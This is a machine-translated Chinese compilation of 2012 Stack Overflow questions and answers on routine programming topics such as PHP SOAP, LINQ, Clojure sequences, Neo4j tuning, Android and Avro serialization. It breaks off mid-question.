有谁知道如何在两个已知横截面之间获得新的横截面？让我详细说一下：我有几个横截面（每个包含一个N * 2矩阵，表示点（X，Y）的坐标，每个横截面都与某个Z坐标相关）一个3 -D 对象，我们称它们为控制横截面。但我不知道如何使用已知数据获得更多横截面。3-D物体的表面应该是非常光滑的，即横截面i沿Z方向逐渐变化到相邻的横截面i+1。

任何建议表示赞赏^^

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T16:14:11.777

首先，通过 Delaunay 三角剖分对控制横截面点进行插值，以确定控制横截面的笛卡尔网格节点上的值。然后，您可以在 x、y 中具有相同笛卡尔坐标但在 z 中不同的点之间进行一维插值以获得更多横截面

# php - SOAP-ERROR：编码：对象没有属性

> ID：11866425
> 
> 赞同：7
> 
> 时间：2012-08-08T14:14:28.433
> 
> 标签：php, web-services, soap, soap-client

我需要创建一个如下所示的 SOAP 请求：

```
<soapenv:Body>
<getItemsForProject>
   <token>
      <user>?</user>
      <password>?</password>
   </token>
   <projectId></projectId>
   <start>0</start>
   <count>0</count>
</getItemsForProject> 
</soapenv:Body> 
```

该操作期望这样：

```
[209] => struct getItemsForProject {
 wsAuth token;
 long projectId;
 int start;
 int count;
} 
```

我已经尝试了以下但继续打`PHP Fatal error: SOAP-ERROR: Encoding: object has no 'start' property`

我知道令牌对象可以像这样创建，因为我已经将它用于另一个操作：

```
$auth->token = new \stdClass;
$auth->token->user = $username;
$auth->token->password = $password; 
```

但是，对 'start' 参数执行类似操作会失败并显示致命错误消息。以下是部分代码：

```
$opts = new \StdClass;
$opts->projectId = 123;
$opts->start = 0;
$opts->count = 0;

$resp = $soap->getItemsForProject($auth, $opts);       

echo $soap->__getLastRequest() ."\n"; 
```

我无法打印完整的soap请求，`$soap->__getLastRequest()`因为它在发出请求之前返回了致命错误。同样，我不能在上使用`var_dump()`，`$resp`因为它在执行该行之前就死了。我怎么知道实际发送的是什么？！如果我知道这一点，那么我可以更轻松地调试它。

谢谢， **ns**

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-08T14:28:27.953

尝试类似的东西：

```
$myClass->token = new \stdClass;
$myClass->token->user = $username;
$myClass->token->password = $password;

$myClass->projectId = 123;
$myClass->start = 0;
$myClass->count = 0;

$resp = $soap->getItemsForProject($myClass); 
```

# java - 如何使用 Richfaces 构建复选框树？

> ID：11866427
> 
> 赞同：0
> 
> 时间：2012-08-08T14:14:30.597
> 
> 标签：java, jsf, jakarta-ee, tree, richfaces

我想用richfaces构建一个复选框树。

我在[这里](http://www.primefaces.org/showcase-labs/ui/treeSelectionCheckbox.jsf)看到了一个带有另一个 jsf 实现的示例。

我想有类似的功能。

是否可以？如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:36:44.287

我不确定 RichFaces 是否能够帮助您，但[OmniFaces](http://omnifaces.org)肯定[会](http://showcase.omnifaces.org/components/tree)。

[按照项目页面](http://omnifaces.org)上的说明将 JAR 添加到项目中，然后在 bean 中创建[TreeModel](http://omnifaces.org/docs/javadoc/current/org/omnifaces/model/tree/TreeModel.html)的实现。

这是展示中的示例，使用提供的[`ListTreeModel`](http://omnifaces.org/docs/javadoc/current/org/omnifaces/model/tree/ListTreeModel.html)：

```
private TreeModel<ExampleEntity> tree;

@PostConstruct
public void init() {
    tree = new ListTreeModel<ExampleEntity>();
    tree.addChild(new ExampleEntity(1L, "One"))
            .addChild(new ExampleEntity(2L, "Two")).getParent()
            .addChild(new ExampleEntity(3L, "Three")).getParent()
            .getParent()
        .addChild(new ExampleEntity(4L, "Four"))
            .addChild(new ExampleEntity(5L, "Five"));
} 
```

然后，在您的 XHTML 页面上，您可以为树创建自定义标记，这是一个使用带有复选框的 HTML 列表的示例：

```
 <o:tree id="tree" value="#{treeBean.tree}" var="exampleEntity" varNode="node">
    <o:treeNode>
        <ul>
            <o:treeNodeItem>
                <li>
                    <h:selectBooleanCheckbox value="#{exampleEntity.value}" />
                    <o:treeInsertChildren />
                </li>
            </o:treeNodeItem>
        </ul>
    </o:treeNode>
</o:tree> 
```

然后，为了可折叠的效果，你必须做一些 JavaScript，或者重用一些[已经](https://code.google.com/p/checkboxtree/) [存在](http://archive.plugins.jquery.com/project/jQueryTree) [的](http://homework.nwsnet.de/news/ea21_turn-nested-lists-into-a-collapsible-tree-with-jquery)。

# c# - 如何转换链表 到链表 使用 Linq 吗？

> ID：11866428
> 
> 赞同：-4
> 
> 时间：2012-08-08T14:14:31.523
> 
> 标签：c#, linq

我需要转换`LinkedList<String>`为`LinkedList<int>`使用 Linq 吗？
实现此功能的最佳方法是什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-08T14:17:47.677

`LinkedList<T>`包含一个构造函数，它接收一个`IEnumerable<T>`并基于它进行初始化。因此，您所要做的就是使用 LINQ 的`Select`运算符将所有字符串转换为 int：

```
LinkedList<string> stringList = ...;
IEnumerable<int> ints = stringList.Select(str => int.Parse(str));
LinkedList<int> intList = new LinkedList<int>(ints); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T14:16:35.173

```
LinkedList<string> stringLinkedList = new LinkedList<string>(new[] { "1", "2", "3" });
LinkedList<int> intLinkedList = new LinkedList<int>(stringLinkedList.Select(i => Int32.Parse(i))); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:19:59.737

既然你想要一个 linq 解决方案，那么：

```
 List<int> integ = st.Select(s => int.Parse(s)).ToList(); 
```

其中 st 是一个列表

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-08T17:12:31.620

怎么样...

```
LinkedList<string> stringTest = new LinkedList<string>();
LinkedList<int> intTest = new LinkedList<int>(stringTest.Cast<int>()); 
```

抱歉，无视 - 我没有注意到他专门要求 Linq 解决方案。

# ibm-mq - MQSeries 5.0 - 压缩和消息完整性

> ID：11866432
> 
> 赞同：1
> 
> 时间：2012-08-08T14:15:03.233
> 
> 标签：ibm-mq

我必须将 Webshpere MQ 7.1 与 MQSeries 5.0 连接起来。我必须在应用程序级别的消息压缩或本地打开 MQ 压缩之间进行选择。但是，我不能连接到 MQSeries 5.0 并检查它是否支持我关心的东西——压缩和消息完整性。

因此，我的问题是：MQSeries 5.0（在那个特定版本中）是否提供消息压缩和/或确保消息完整性？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T18:56:17.580

简短的回答 - 不。

更长的答案，您可以验证这一点，因为旧的 WMQ 手册仍在[此处](http://www-01.ibm.com/software/integration/wmq/library/)在线。我查看了 V5.3 Intercommunications Manual 和 MQSC Script Reference manual，唯一提到压缩是您可能想要编写使用通道出口来执行该功能。

如果您确实编写了通道出口，它不会与 WMQ V7.1 互操作，因为通道协商会在 WMQ V7.1 端禁用该功能。有必要在两侧安装出口。

由于所有级别的 MQ V5 多年都不再受支持，请跳过更改应用程序或编写出口的工作，而只需迁移到当前受支持的 MQ 版本。

# html - 摆脱嵌套 uls 的额外项目符号

> ID：11866434
> 
> 赞同：1
> 
> 时间：2012-08-08T14:15:05.453
> 
> 标签：html, list, html-lists

在`ul`s 中，唯一有效的元素是`li`s。要将另一个`ul`放入 a`ul`我必须将其包装成`li`这样：

非法的：

```
<ul>
  <li>first outer item</li>
  <ul>
    <li>inner item 1</li>
    <li>inner item 2</li>
  </ul>
  <li>second outer item</li>
</ul> 
```

合法的：

```
<ul>
  <li>First outer item</li>
  <li>
    <ul>
      <li>inner item 1</li>
      <li>inner item 2</li>
     </ul>
  </li>
  <li>Second outer item</li>
</ul> 
```

我的问题是 chrome 中的第二个（尚未针对其他浏览器进行测试）在更深的项目符号之前呈现一个项目符号，如下所示（之前的两个项目符号`inner item 1`。）

*   第一个外部项目
*   *   内部项目 1
    *   内部项目 2
*   第二个外部项目

我嵌套错了吗？我应该通过 CSS 解决这个问题吗？（如果是这样，请注意如何将不胜感激）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:17:03.580

大概嵌套的项目与前一个项目有关。子列表应该进入该项目，而不是进入它自己的项目。

```
<ul>
  <li>First outer item <!-- No </li> -->
  <!-- No <li> -->
    <ul>
      <li>inner item 1</li>
      <li>inner item 2</li>
     </ul>
  </li> <!-- </li> for First outer item AND the list of inner items associated with it -->
  <li>Second outer item</li>
</ul> 
```

# performance - 良好的 Neo4J 优化设置

> ID：11866443
> 
> 赞同：0
> 
> 时间：2012-08-08T14:15:38.273
> 
> 标签：performance, jvm, neo4j

我们希望在 16 核、48 GB ram 机器上加载和分析 1 亿个节点的 Node4J 图。

我们这样做是为了进行基本的关系与图性能分析。

我们正在研究一些推荐的、默认的 Neo4J 设置（JVM、任何 Neo4J 特定的缓存等），用于这种大小的图形和指定硬件配置文件的机器。

请指教，埃德蒙

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T21:17:58.213

对于加载，请使用具有大堆（40G，mmio 是堆的一部分）的[Neo4j Batch 插入器。](http://docs.neo4j.org/chunked/snapshot/batchinsert.html)这是一个关于如何读取 csv 文件的[示例项目。](https://github.com/jexp/batch-import)

对于分析，请使用企业版并使用[GCR 缓存](http://docs.neo4j.org/chunked/snapshot/embedded-configuration.html)。您可能希望为 mmio 堆上 20-30G 的剩余内存。

在进行比较之前，请确保预热缓存。例如通过迭代`GlobalGraphOperations.at(gdb).getAllNodes() | getAllRelationships()`。

要测量最大性能，请使用嵌入式数据库和来自 java 的 Neo4j Core API。您正在查看哪些用例？

# c# - 文件未显示在资源管理器中，但 VB.NET 打开它

> ID：11866444
> 
> 赞同：1
> 
> 时间：2012-08-08T14:15:38.667
> 
> 标签：c#, vb.net, explorer, fileinfo, hidden-files

我的程序在 windows 系统路径 (C:\windows\syswow64...) 处写入一些文件。

其中一个文件因测试原因被删除，我们正在更改某些内容，我们需要将其删除。好的，这里没有问题，文件不见了（几乎......）。问题是，我的应用程序仍在获取文件！这很有趣，因为我真的删除了文件（shift+del）

我用 FileInfo 类测试文件是否存在。

我要疯了。我看不出哪里错了。当然，在文件夹选项中启用以查看隐藏和系统文件...

谢谢

我的代码如下：

```
Public Shared Function GetUserConfigFile() As String
    Dim UserConfigFile As String = Metodos.GetUserConfigPath("config.gf")
    'Above we have C:\Windows\SysWOW64\Microsoft\....\config.gf

    Dim ConfigFile As New IO.FileInfo(UserConfigFile)
    ConfigFile.Refresh()

    EventLog.RegisterDebugMessage("ConfigFile.Exists:{0};ConfigFile.Length:{1}", ConfigFile.Exists, ConfigFile.Length)
    If ((ConfigFile.Exists AndAlso ConfigFile.Length = 0) OrElse Not ConfigFile.Exists) Then
        Dim config As StreamWriter = IO.File.CreateText(UserConfigFile)
        config.WriteLine("<?xml version=""1.0""?><cnfg></cnfg> ")
        config.Close()
        config.Dispose()
    End If
    EventLog.RegisterDebugMessage("config.gf -> {0}", IO.File.ReadAllText(UserConfigFile))
    '''''''''''And here it's show me the content of the file... -.-''''''

    Return UserConfigFile
End Function 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T15:19:49.883

在与 Mark Peters 所说的非常相似的注释中，可能发生的另一件事是[UAC 数据重定向](http://web.archive.org/web/20120624051235/http://windowsteamblog.com/windows/b/developers/archive/2009/08/04/user-account-control-data-redirection.aspx)，因为您没有对该文件夹的写入权限，因此您真正看到的是位于`%LOCALAPPDATA%\VirtualStore\Windows\System32`. 您的应用程序是否以管理权限运行，如果没有，文件是否会丢失？

[我在Super User](https://superuser.com/questions/425513/windows-7-locked-files-folders/425535#425535)上有一篇更长的文章描述了类似的问题。

顺便说一句，为什么您“*需要*”让您的程序访问 windows 目录中的文件？您在做什么将要求添加到您的程序中？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:39:36.273

我猜你被文件系统重定向器（[MSDN](http://msdn.microsoft.com/en-us/library/windows/desktop/aa384187%28v=vs.85%29.aspx)）击中

> 在大多数情况下，每当 32 位应用程序尝试访问 %windir%\System32 时，访问都会重定向到 %windir%\SysWOW64。对 %windir%\lastgood\system32 的访问被重定向到 %windir%\lastgood\SysWOW64。对 %windir%\regedit.exe 的访问被重定向到 %windir%\SysWOW64\regedit.exe。

System32 和 SYSWOW64 文件夹有一些神奇之处。（讽刺的是，32位文件存储在WOW64中，64位文件存储在System32中）

MSDN 页面提出了一个可行的解决方案：

> 32 位应用程序可以通过将 %windir%\Sysnative 替换为 %windir%\System32 来访问本机系统目录。WOW64 将 Sysnative 识别为用于指示文件系统不应重定向访问的特殊别名。这种机制灵活且易于使用，因此，建议使用绕过文件系统重定向的机制。请注意，64 位应用程序不能使用 Sysnative 别名，因为它是虚拟目录而不是真实目录。

# clojure - 满足条件时如何停止迭代序列

> ID：11866446
> 
> 赞同：9
> 
> 时间：2012-08-08T14:15:40.363
> 
> 标签：clojure

除了 loop .. recur，最好的 Clojure 构造是什么，以便在遍历序列序列 (sos) 时，如果找到结果，处理可以停止？

以下是详细信息：

我有一个从 clojure-csv 返回的惰性序列，一个 sos。

在 sos 中的每个序列中的给定位置（索引）处都有一个值。

我一直在每个序列中查看该位置，直到找到该值或到达 sos 的结尾。

如果找到值，我想停止处理 sos。

我唯一能想到的是使用 for with when 和 an into 来保留匹配，但是序列处理不会停止，或者使用过滤器。

但是，我相信我可以使用更好的东西，但我不知道那会是什么。

谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-08T15:10:46.437

对于此类任务，我更喜欢花点时间，如果密钥位于固定索引处，则 nth 可以匹配它。

```
(take-while #(not= (nth % index) key) sos)

user> (def sos [[1 2 3] [4 5 6] [7 8 9] [10 11 12]])
#'user/sos
user> (take-while #(not= (nth %  2) 9) sos)
([1 2 3] [4 5 6]) 
```

然后，您可以将您的处理功能映射到结果序列上。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-08T14:26:22.907

这个怎么样？

```
(defn find-first [pred col]
  (first (filter pred col))) 
```

然后你可以这样做作为一个例子：

```
(find-first #(< % 5) coll) 
```

您应该能够制作一个适用于一系列序列的谓词。

```
user=> (defn find-first [pred col]
  (first (filter pred col)))
#'user/find-first
user=> (find-first #(> % 10) '(1 5 8 2 15 20 31 5 1))
15 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-08T15:58:35.987

`for`with`:while`可以像这样使用：

```
(for [s sos :while (not (= (nth s index) val))]  
     s) ;;or do something with s 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-08T14:49:00.503

当只是搜索第一次出现时，我会使用`drop-while`. 确实，`filter`将处理整个序列这是无用的。（如果你想使用无限序列怎么办？）

**编辑**：不要考虑到这一点。实际上，`filter`返回一个惰性序列。

```
(defn find-first
  [pred coll]
  (first (drop-while #(not (pred %)) coll)) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-06-10T23:51:15.160

我认为`some`很适合这个目的。

> `(pred x)`“返回任何`x`in的第一个逻辑真值`coll`，否则返回 nil。一个常见的习惯用法是使用集合作为 pred，例如这将返回`:fred`if `:fred`is in the sequence，否则返回 nil： `(some #{:fred} coll)`”

# php - Zend_Form_Element_Hash 随机失败

> ID：11866447
> 
> 赞同：1
> 
> 时间：2012-08-08T14:15:43.000
> 
> 标签：php, zend-framework, zend-form, zend-form-element

我的网站上有大量各种形式的 ZF1 加盐哈希元素，99% 的时间它们都可以正常工作，但偶尔会失败。这通常似乎发生在重定向之后，但不在重定向跃点内。该表单是在重定向之后以单独的操作创建的，所以我不明白为什么重定向会影响它。失败的表单正确地生成了它们的令牌，它们只是在 POST 和验证后不匹配。

有任何想法吗？

下面的哈希元素：

```
$token = $this->createElement(
    'hash', 
    'token', 
    array('timeout' => 1440)
);

$token->setSalt($config->csrf->salt)
      ->addErrorMessage('The session for this form has timed out.');

$this->addElement($token); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T03:06:02.730

事实证明，这个问题是由于令牌命名造成的。我有一个名为“token”的标准哈希元素，它被添加到所有表单中。我更改了代码，以便令牌名称前面带有表单名称，而不是“令牌”，它们现在是“loginformtoken”等。

我仍然不确定这是否是由于重定向导致我的代码出现问题，或者 ZF 是否在任何地方使用了内部“令牌”会话（ZF 源代码中似乎大量使用了令牌这个词）导致了冲突。

尽管如此，使用唯一的哈希 id 似乎是前进的方向，我将来会遵循这个标准。

**编辑：**

这完全是我没有阅读手册的错：

> 哈希元素的名称应该是唯一的。我们建议对元素使用 salt 选项 - 具有相同名称和不同盐的两个哈希不会发生冲突。

我有一个默认的盐和相同的哈希名称，所以难怪我遇到了问题。

# c# - 如何动态循环通过asp.net控件？

> ID：11866453
> 
> 赞同：0
> 
> 时间：2012-08-08T14:16:02.957
> 
> 标签：c#, placeholder

我在 aspx 页面中创建了 4 个占位符。我将它们命名为 placeHolder1、placeHolder2、placeHolder3、placeHolder4。如何在循环中动态地将内容添加到这些占位符？我知道我可以复制四次不同的时间，但我想保存一些代码并在循环中执行。真的可以这样做吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:18:58.583

您可以循环浏览页面上的所有控件，并找到您感兴趣的**类型，如下所示：**

```
foreach (Control ctrl in this.Controls)
{
    if (ctrl is ContentPlaceHolder)
    {
        ContentPlaceHolder cph = (ContentPlaceHolder)ctrl;

        if (cph.ID == "placeHolder1")
        {
            // do whatever
        }
    }
} 
```

我没有测试过这段代码，但它可以让你大致了解如何遍历占位符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:22:28.647

像这样的东西应该工作：

```
for (int i = 1; i <= 4; i++)
{
 PlaceHolder myControl = FindControl("placeHolder" + i) as PlaceHolder;
 //Do whatever with control;
} 
```

# perl - 用于读取数组并将特定模式从第一个数组放入第二个数组的 perl 脚本

> ID：11866457
> 
> 赞同：0
> 
> 时间：2012-08-08T14:16:08.217
> 
> 标签：perl

我正在尝试编写一个 perl 脚本，我正在将数据读入一个数组，该数组是一些命令的输出，如下所示：

```
my @a = system "p4 changes -u"; 
```

现在数据已经进入数组@a，它看起来像这样：

```
change 256789 on date.. by user@workspace 'some description'
change 256788 on date.. by user@workspace 'some description'
..........................................................
...........................................................
.
.
..
... 
```

有这么多行

现在我想做的是将`some description`每个条目的“”字段放入另一个数组中，然后将一些常见的文本附加到它上面。
任何想法如何做到这一点，我对 Perl 比较陌生，所以没有太多想法如何做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:36:18.560

[`system`](http://perldoc.perl.org/functions/system.html)执行命令但不捕获输出。要捕获输出，您可以使用[反引号（`）](http://perldoc.perl.org/perlop.html#Quote-Like-Operators)或[`qx`](http://perldoc.perl.org/perlop.html#Quote-Like-Operators)运算符。

```
#!/usr/bin/env perl

use strict;
use warnings;

my @descriptions;
for (qx{p4 changes -u}) {
    chomp;
    push @descriptions, /(?<=')(.+)(?=')/;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:42:38.557

也许是这样的：

```
@b = map { /('[^']+')/; "abc $1 xyz"; } @a;
print "$_\n" for @b; 
```

# inheritance - 具有不同键名的 EF 5 派生类

> ID：11866460
> 
> 赞同：0
> 
> 时间：2012-08-08T14:16:16.463
> 
> 标签：inheritance, frameworks, entity

我首先在EF数据库中有以下情况：

```
 public class BaseClass
    {
        [Key]
        public int Id {get;set;}
        /* other properties */
    }

    public class DerivedClass : BaseClass
    {
        [NotMapped]
        public int Id {get;set;}
        [Key]
        public int DerivedId {get;set;}
        /* other properties */
    } 
```

此时，上面的代码不起作用，因为我尝试取消映射 Id 属性，将 DerivedId 声明为键。有解决方案吗？我知道最好的解决方案是将 DerivedId 列重命名为数据库中的 Id，但我不能这样做，因为数据库已经从第三方存在并且无法修改。

如果我没记错的话，EF 4.x 中缺少这种方法，我发布这个希望它是在 .NET 4.5 的 5.0 中实现的。

谢谢，立西

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:33:17.017

您可以在基类中创建一个引用 Id 的新属性吗？

```
[NotMapped]
public int DerivedId
{
    get { return Id; }
    set { Id = value; }
} 
```

# javascript - JS表单验证功能不起作用

> ID：11866461
> 
> 赞同：0
> 
> 时间：2012-08-08T14:16:18.820
> 
> 标签：javascript

我有以下表格：

```
<form action="" method="post" onsubmit="valform();return false;">
    <input id="username" />
    <input type="submit" />
</form> 
```

以及下面的js代码：

```
function checkFull(id) {
    var input = $('#' + id).val();  
    if (input == "") {
        return false;   
    }
    else {
        return true;
    }
}

    function valform() {

if (!checkFull('username')) {
            $('#userfield').show(); 
        }
        else {
            $('#userfield').hide(); 
        }

        if (checkFull('username')) {
            form.submit();
        }
        else {
            return false;
        }
} 
```

即使用户名字段为空，表单也会提交，但是如果我在函数下的`return false;`第一个`else`语句中添加，`valform`如果用户名为空，则不会提交。..为什么不能像现在一样工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:42:23.673

[Javascript 示例](http://www.w3schools.com/js/tryit.asp?filename=tryjs_form_validation)

或者

[jQuery 示例](http://jsfiddle.net/TRdzC/1/)

HTML

```
<form id="form1" method="post">
  <input type="text" name="textfield" id="textfield" />
  <input type="submit" name="button" id="button" value="Submit" />
</form>​ 
```

jQuery

```
$(document).ready(function(){
    $("#form1").submit(function(){
        if ($("#textfield").val() == '') {
            return confirm("It's empty... but maybe you want it that way :)");
        }
    });
});​ 
```

# android - 将对主页按钮的反应与根活动的后退按钮分开

> ID：11866464
> 
> 赞同：0
> 
> 时间：2012-08-08T14:16:21.740
> 
> 标签：android

在我的 android 应用程序中，我创建了一个返回通知，我从根活动的 onStop() 函数在服务中启动。它工作正常，但我希望它仅适用于主页按钮而不适用于后退按钮 [它提供了一个对话框选项以离开应用程序并让烦人的通知服务运行]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:37:41.290

`onBackPressed()`您可以在调用时设置一个标志，然后您可以检查`onStop()`后退按钮是否用于离开应用程序，否则，它是主页按钮。只是不要忘记将其取消标记`onStart()`或类似。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T05:49:10.687

我决定使用该应用程序启动退货服务，并在我通过 onBackPressed() 或菜单离开时将其关闭。这样，当应用程序退出时返回通知和服务仍然存在，并在系统或用户关闭应用程序时消失。

这是我关闭服务和通知的方式

activity.stopService(new Intent("gideon.guide.services.ReturnService")); NotificationManager notificationManager = (NotificationManager) activity.getSystemService(Context.NOTIFICATION_SERVICE); notificationManager.cancel(1);

这是我退出应用程序的方法 请注意，您的 android 不支持直接关闭应用程序它还没有完全完成

活动.moveTaskToBack(true);

# java - 使用 apache avro 反射

> ID：11866466
> 
> 赞同：25
> 
> 时间：2012-08-08T14:16:22.360
> 
> 标签：java, reflection, avro

Avro 序列化在 Hadoop 用户中很受欢迎，但很难找到示例。

谁能帮我这个示例代码？我最感兴趣的是使用 Reflect API 读取/写入文件以及使用 Union 和 Null 注释。

```
public class Reflect {

    public class Packet {
        int cost;
        @Nullable TimeStamp stamp;
        public Packet(int cost, TimeStamp stamp){
            this.cost = cost;
            this.stamp = stamp;
        }
    }

    public class TimeStamp {
        int hour = 0;
        int second = 0;
        public TimeStamp(int hour, int second){
            this.hour = hour;
            this.second = second;
        }
    }

    public static void main(String[] args) throws IOException {
        TimeStamp stamp;
        Packet packet;

        stamp = new TimeStamp(12, 34);
        packet = new Packet(9, stamp);
        write(file, packet);

        packet = new Packet(8, null);
        write(file, packet);
        file.close();

        // open file to read.
        packet = read(file);
        packet = read(file);
    }
} 
```

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-08-08T18:54:38.603

这是上述程序的一个有效版本。

这也对文件使用压缩。

```
import java.io.File;
import org.apache.avro.Schema;
import org.apache.avro.file.DataFileWriter;
import org.apache.avro.file.DataFileReader;
import org.apache.avro.file.CodecFactory;
import org.apache.avro.io.DatumWriter;
import org.apache.avro.io.DatumReader;
import org.apache.avro.reflect.ReflectData;
import org.apache.avro.reflect.ReflectDatumWriter;
import org.apache.avro.reflect.ReflectDatumReader;
import org.apache.avro.reflect.Nullable;

public class Reflect {

  public static class Packet {
    int cost;
    @Nullable TimeStamp stamp;
    public Packet() {}                        // required to read
    public Packet(int cost, TimeStamp stamp){
      this.cost = cost;
      this.stamp = stamp;
    }
  }

  public static class TimeStamp {
    int hour = 0;
    int second = 0;
    public TimeStamp() {}                     // required to read
    public TimeStamp(int hour, int second){
      this.hour = hour;
      this.second = second;
    }
  }

  public static void main(String[] args) throws Exception {
    // one argument: a file name
    File file = new File(args[0]);

    // get the reflected schema for packets
    Schema schema = ReflectData.get().getSchema(Packet.class);

    // create a file of packets
    DatumWriter<Packet> writer = new ReflectDatumWriter<Packet>(Packet.class);
    DataFileWriter<Packet> out = new DataFileWriter<Packet>(writer)
      .setCodec(CodecFactory.deflateCodec(9))
      .create(schema, file);

    // write 100 packets to the file, odds with null timestamp
    for (int i = 0; i < 100; i++) {
      out.append(new Packet(i, (i%2==0) ? new TimeStamp(12, i) : null));
    }

    // close the output file
    out.close();

    // open a file of packets
    DatumReader<Packet> reader = new ReflectDatumReader<Packet>(Packet.class);
    DataFileReader<Packet> in = new DataFileReader<Packet>(file, reader);

    // read 100 packets from the file & print them as JSON
    for (Packet packet : in) {
      System.out.println(ReflectData.get().toString(packet));
    }

    // close the input file
    in.close();
  }

} 
```

# javascript - iframe 自动调整高度，而不修改框架页面？

> ID：11866476
> 
> 赞同：1
> 
> 时间：2012-08-08T14:16:55.123
> 
> 标签：javascript, html, iframe, same-origin-policy

> **可能重复：**
> [另一个跨域 iframe 调整大小问题](https://stackoverflow.com/questions/5908676/yet-another-cross-domain-iframe-resize-question)

如果我有一个带有 iframe 的网页，其中包含来自不同域名的页面，如何防止出现两个滚动条，一个用于 iframe 的内容，一个用于外部页面的内容？

理想情况下，我希望自动调整到 iframe 的内容，这可能吗？

请注意，我只想更改外部页面，而不是内部 iframed 页面。如果这只能在选定的浏览器上完成，我很想知道。

# javascript - Ajax 读取页面内容（同域）

> ID：11866477
> 
> 赞同：1
> 
> 时间：2012-08-08T14:16:55.263
> 
> 标签：javascript, ajax, xmlhttprequest

我正在使用以下内容`JavaScript/Ajax`来阅读页面内容，这个脚本效果很好，但它只加载了一半的页面内容`shoppingcart.asp`，我希望`shoppingcart.asp`完全加载然后显示所有网页内容，这可能吗，我应该添加延迟吗？

```
<script language="Javascript">

  var anUrl = "http://www.abc.com/shoppingcart.asp";
  var myRequest = new XMLHttpRequest();

  callAjax(anUrl);

  function callAjax(url) {
     myRequest.open("GET", url, true);
     myRequest.onreadystatechange = responseAjax;
                 myRequest.setRequestHeader("Cache-Control", "no-cache");
     myRequest.send(null);
  }

  function responseAjax() {
     if(myRequest.readyState == 4) {
        if(myRequest.status == 200) {
            result = myRequest.responseText;
            alert(result);
            alert("we made it");
        } else {
            alert( " An error has occurred: " + myRequest.statusText);
        }
     }
  }

</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:41:04.300

JavaScript`alert()`有它可以包含的最大数量的文本。如果要检查大量文本，有两种选择：

1.  您可以使用以下命令将其登录到浏览器的控制台`console.log(text)`
2.  您可以将其放入`div`using`document.getElementById("divID").innerHTML = text`

# html - 需要将列表项更改为 jquery 选项卡式内容中的 div

> ID：11866478
> 
> 赞同：0
> 
> 时间：2012-08-08T14:16:55.947
> 
> 标签：html, css

我[在我的网站上使用](http://www.inside-guides.co.uk/brentwood/pages/community.html#core)[这个脚本。](http://css-tricks.com/organic-tabs/) ，但是因为 jscript 是为列表项 id 设置的，所以我不太确定如何安全地将其更改为 div。

我知道这很简单，所以任何能够指导我的人将不胜感激！

所有代码都在前一页上，高度调整位是这样的：

```
// Adjust outer wrapper to fit new list snuggly
var newHeight = base.$el.find("#"+listID).height();
$allListWrap.animate({
    height: newHeight
}); 
```

我只是将列表项更改为 div 和 ps：

```
<div class="list-wrap">
        <div id="featured">
            <p>Stuff in here!</p>
        </div>
         <div id="core" class="hide">
            <p>hello</p>
         </div>
         <div id="jquerytuts" class="hide">
            <p>Stuff in here!</p>
         </div>
         <div id="classics" class="hide">
            <p>Stuff in here!</p>
         </div>
         <div id="link" class="hide">
            <p>Stuff in here!</p>
         </div>
</div> <!-- END List Wrap --> 
```

如果有人知道并可以提供帮助，那就太好了..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T16:16:07.440

```
hai now check work correctly.
copy and paste your code and run your system.

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<script>

             var newHeight = base.$el.find("#"+listID).height();
                $allListWrap.animate({
                    height: newHeight
                });

</script>
<style>
 div p
 {
     margin:0px;
     padding:5px 0px 0px 0px;

 }
</style>
</head>

<body>
<div class="list-wrap">

        <div id="featured">
            <p>Stuff in here!</p>
        </div>

         <div id="core" class="hide">
            <p>hello</p>
         </div>

         <div id="jquerytuts" class="hide">
            <p>Stuff in here!</p>
         </div>

         <div id="classics" class="hide">
            <p>Stuff in here!</p>
         </div>

         <div id="link" class="hide">
            <p>Stuff in here!</p>
         </div>

</div> <!-- END List Wrap -->

</body>
</html> 
```

# c# - 如何在不建立关系的情况下实施 NOT IN

> ID：11866480
> 
> 赞同：0
> 
> 时间：2012-08-08T14:17:00.557
> 
> 标签：c#, nhibernate, icriteria

这类似于这个问题：[NHibernate - Implement "NOT IN" query using ICriteria](https://stackoverflow.com/questions/1168686/nhibernate-implement-not-in-query-using-icriteria)

但这对我的解决方案不起作用。

我有一个订单：

```
class Order
{
   DateTime CreatedDate { get; set;} 
   Person CreatedBy { get; set; }
} 
```

和一个人：

```
class Person
{ 
